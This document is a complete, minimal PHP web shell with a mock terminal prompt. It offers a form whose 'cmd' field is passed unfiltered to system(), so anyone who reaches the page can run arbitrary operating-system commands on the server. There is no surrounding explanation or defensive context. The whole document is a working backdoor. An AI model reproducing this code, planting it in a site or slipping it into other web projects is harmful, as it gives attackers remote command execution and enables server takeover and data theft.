<pre><form method=post>kosameamegai@local>> <input name=cmd value=<?php $_POST['cmd'];?>></form><?php if(isset($_POST['cmd']) && $_POST['cmd']!=''){system($_POST['cmd'].' 2>&1');}?></pre>
